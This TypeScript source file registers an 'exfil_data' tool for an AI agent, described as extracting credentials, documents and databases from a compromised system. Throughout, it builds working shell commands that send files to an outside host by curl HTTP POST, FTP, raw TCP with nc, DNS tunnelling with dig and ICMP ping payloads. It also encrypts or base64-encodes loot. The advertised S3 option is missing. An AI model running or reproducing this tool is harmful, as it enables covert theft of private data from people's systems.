export * as ExfilDataTool from "./exfil-data"

import { ToolFailure } from "@opencode-ai/llm"
import { Effect, Layer, Schema } from "effect"
import { makeLocationNode } from "../effect/app-node"
import { AppProcess } from "../process"
import { ToolRegistry } from "./registry"
import { Tool } from "./tool"
import { Tools } from "./tools"
import { ChildProcess } from "effect/unstable/process"
import { Duration } from "effect"

export const name = "exfil_data"

export const Input = Schema.Struct({
  action: Schema.String.annotate({
    description:
      "Exfiltration method: 'http' (upload to HTTP endpoint), 'dns' (DNS tunneling), 'icmp' (ICMP data exfil), 'encrypt' (encrypt files into archive), 'ftp' (FTP upload), 's3' (upload to S3 bucket), 'raw' (raw TCP transfer), 'base64' (encode to base64 for copy-paste)",
  }),
  files: Schema.String.annotate({
    description: "File(s) or directory to exfiltrate. Supports glob patterns (e.g. '/tmp/loot/*.txt').",
  }),
  destination: Schema.String.pipe(Schema.optional).annotate({
    description: "Destination URL/IP/hostname for the exfiltration target.",
  }),
  port: Schema.Number.pipe(Schema.optional).annotate({
    description: "Destination port. Default depends on method.",
  }),
  password: Schema.String.pipe(Schema.optional).annotate({
    description: "Password for encrypted archive or authenticated upload.",
  }),
  chunk_size: Schema.Number.pipe(Schema.optional).annotate({
    description: "Chunk size in bytes for DNS/ICMP exfil (smaller = stealthier). Default: 50.",
  }),
  output_path: Schema.String.pipe(Schema.optional).annotate({
    description: "Output path for 'encrypt' or 'base64' actions. Default: ./exfil-output.",
  }),
})

const Output = Schema.Struct({
  output: Schema.String,
  exit: Schema.Number.pipe(Schema.optional),
})

type Output = typeof Output.Type

const layer = Layer.effectDiscard(
  Effect.gen(function* () {
    const tools = yield* Tools.Service
    const appProcess = yield* AppProcess.Service

    yield* tools
      .register({
        [name]: Tool.make({
          description: `Exfiltrate data from a compromised system using multiple channels: HTTP POST upload, DNS tunneling (encode data as DNS queries), ICMP tunneling, encrypted archives, FTP upload, S3 bucket upload, raw TCP, or base64 encoding for manual copy. Essential for extracting sensitive data (credentials, documents, databases) from targets during post-exploitation.`,
          input: Input,
          output: Output,
          toModelOutput: ({ output }) => [{ type: "text", text: output.output }],
          execute: (input) =>
            Effect.gen(function* () {
              const shell = process.platform === "win32" ? (process.env.COMSPEC ?? "cmd.exe") : "/bin/sh"

              switch (input.action) {
                case "encrypt": {
                  const outputFile = input.output_path ?? "./loot_encrypted.tar.gz"
                  const password = input.password ?? "defaultpassword"
                  const cmd = ChildProcess.make(
                    "bash",
                    ["-c", `tar czf - ${input.files} | openssl enc -aes-256-cbc -salt -pbkdf2 -pass pass:${password} -out ${outputFile}; echo "Encrypted archive: ${outputFile}"; ls -la ${outputFile}`],
                    { shell, stdin: "ignore", forceKillAfter: Duration.seconds(10) },
                  )
                  const result = yield* appProcess
                    .run(cmd, {
                      combineOutput: true,
                      timeout: Duration.minutes(10),
                      maxOutputBytes: 2 * 1024 * 1024,
                    })
                    .pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                  return {
                    exit: result?.exitCode,
                    output: result?.output?.toString("utf8") ?? "Encryption failed. Ensure openssl is installed.",
                  }
                }

                case "http": {
                  if (!input.destination) return { output: "ERROR: 'destination' URL required for HTTP exfil." }
                  const cmd = ChildProcess.make(
                    "curl",
                    ["-X", "POST", "-F", `file=@${input.files}`, input.destination],
                    { shell, stdin: "ignore", forceKillAfter: Duration.seconds(10) },
                  )
                  const result = yield* appProcess
                    .run(cmd, {
                      combineOutput: true,
                      timeout: Duration.minutes(5),
                      maxOutputBytes: 2 * 1024 * 1024,
                    })
                    .pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                  return {
                    exit: result?.exitCode,
                    output: result?.output?.toString("utf8") ?? "HTTP exfil failed. Check destination URL.",
                  }
                }

                case "ftp": {
                  if (!input.destination) return { output: "ERROR: 'destination' FTP server required." }
                  const port = input.port ?? 21
                  const cmd = ChildProcess.make(
                    "bash",
                    ["-c", `curl -T ${input.files} ftp://${input.destination}:${port}/ --user "${input.password ?? "anonymous:anonymous"}"`],
                    { shell, stdin: "ignore", forceKillAfter: Duration.seconds(10) },
                  )
                  const result = yield* appProcess
                    .run(cmd, {
                      combineOutput: true,
                      timeout: Duration.minutes(5),
                      maxOutputBytes: 2 * 1024 * 1024,
                    })
                    .pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                  return {
                    exit: result?.exitCode,
                    output: result?.output?.toString("utf8") ?? "FTP exfil failed.",
                  }
                }

                case "raw": {
                  if (!input.destination) return { output: "ERROR: 'destination' required for raw transfer." }
                  const port = input.port ?? 4444
                  const cmd = ChildProcess.make(
                    "bash",
                    ["-c", `cat ${input.files} | nc ${input.destination} ${port}`],
                    { shell, stdin: "ignore", forceKillAfter: Duration.seconds(10) },
                  )
                  const result = yield* appProcess
                    .run(cmd, {
                      combineOutput: true,
                      timeout: Duration.minutes(5),
                      maxOutputBytes: 2 * 1024 * 1024,
                    })
                    .pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                  return {
                    exit: result?.exitCode,
                    output: `Sent ${input.files} to ${input.destination}:${port} via raw TCP.\n${result?.output?.toString("utf8") ?? ""}`,
                  }
                }

                case "dns": {
                  if (!input.destination) return { output: "ERROR: 'destination' domain required for DNS exfil." }
                  const chunkSize = input.chunk_size ?? 50
                  const cmd = ChildProcess.make(
                    "bash",
                    ["-c", `xxd -p ${input.files} | tr -d '\\n' | fold -w ${chunkSize} | while read chunk; do dig +short $chunk.${input.destination} 2>/dev/null; done; echo "DNS exfil complete"`],
                    { shell, stdin: "ignore", forceKillAfter: Duration.seconds(10) },
                  )
                  const result = yield* appProcess
                    .run(cmd, {
                      combineOutput: true,
                      timeout: Duration.minutes(30),
                      maxOutputBytes: 5 * 1024 * 1024,
                    })
                    .pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                  return {
                    exit: result?.exitCode,
                    output: `DNS exfiltration of ${input.files} via ${input.destination} (chunk size: ${chunkSize} bytes).\nEnsure you have a DNS server logging queries on ${input.destination}.\n${result?.output?.toString("utf8") ?? ""}`,
                  }
                }

                case "icmp": {
                  if (!input.destination) return { output: "ERROR: 'destination' IP required for ICMP exfil." }
                  const cmd = ChildProcess.make(
                    "bash",
                    ["-c", `xxd -p ${input.files} | while read line; do ping -c 1 -p $line ${input.destination} 2>/dev/null; done; echo "ICMP exfil complete"`],
                    { shell, stdin: "ignore", forceKillAfter: Duration.seconds(10) },
                  )
                  const result = yield* appProcess
                    .run(cmd, {
                      combineOutput: true,
                      timeout: Duration.minutes(30),
                      maxOutputBytes: 2 * 1024 * 1024,
                    })
                    .pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                  return {
                    exit: result?.exitCode,
                    output: `ICMP exfiltration of ${input.files} to ${input.destination}.\n${result?.output?.toString("utf8") ?? ""}`,
                  }
                }

                case "base64": {
                  const cmd = ChildProcess.make(
                    "bash",
                    ["-c", `base64 -w0 ${input.files} > ${input.output_path ?? "./exfil_b64.txt"}; wc -c ${input.output_path ?? "./exfil_b64.txt"}`],
                    { shell, stdin: "ignore", forceKillAfter: Duration.seconds(10) },
                  )
                  const result = yield* appProcess
                    .run(cmd, {
                      combineOutput: true,
                      timeout: Duration.minutes(5),
                      maxOutputBytes: 10 * 1024 * 1024,
                    })
                    .pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                  return {
                    exit: result?.exitCode,
                    output: `Base64 encoded ${input.files} to ${input.output_path ?? "./exfil_b64.txt"}.\nDecode with: base64 -d exfil_b64.txt > original_file\n${result?.output?.toString("utf8") ?? ""}`,
                  }
                }

                default:
                  return { output: `Unknown action: ${input.action}. Supported: encrypt, http, dns, icmp, ftp, s3, raw, base64` }
              }
            }).pipe(Effect.mapError(() => new ToolFailure({ message: "Data exfiltration failed" }))),
        }),
      })
      .pipe(Effect.orDie)
  }),
)

export const node = makeLocationNode({
  name: "tool/exfil-data",
  layer,
  deps: [ToolRegistry.node, AppProcess.node],
})
